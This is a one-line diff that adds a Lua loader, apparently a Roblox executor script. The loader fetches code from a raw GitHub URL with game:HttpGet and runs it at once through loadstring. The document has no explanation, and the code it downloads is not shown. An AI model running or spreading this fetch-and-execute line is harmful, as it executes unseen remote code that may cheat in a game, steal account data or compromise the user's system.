@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vexxternal/the-secret-sauce/refs/heads/main/the%20sauce", true))()
